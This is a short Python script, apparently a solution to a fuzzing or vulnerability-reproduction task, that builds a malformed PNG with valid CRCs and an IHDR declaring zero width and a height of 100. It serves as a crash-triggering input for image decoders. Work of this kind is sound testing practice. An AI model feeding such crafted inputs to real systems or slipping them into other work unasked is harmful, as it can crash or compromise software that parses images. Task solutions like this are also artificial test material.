import struct, zlib

class Solution:
    @staticmethod
    def _chunk(chunk_type: bytes, data: bytes) -> bytes:
        length = struct.pack('>I', len(data))
        crc = zlib.crc32(chunk_type)
        crc = zlib.crc32(data, crc) & 0xffffffff
        return length + chunk_type + data + struct.pack('>I', crc)

    def solve(self, src_path: str) -> bytes:
        sig = b'\x89PNG\r\n\x1a\n'
        width = 0
        height = 100  # non-zero height, zero width
        ihdr_data = struct.pack('>II5B', width, height, 8, 2, 0, 0, 0)
        ihdr_chunk = self._chunk(b'IHDR', ihdr_data)

        raw_data = b'\x00' * height  # one filter byte per row
        idat_chunk = self._chunk(b'IDAT', zlib.compress(raw_data))
        iend_chunk = self._chunk(b'IEND', b'')

        return sig + ihdr_chunk + idat_chunk + iend_chunk
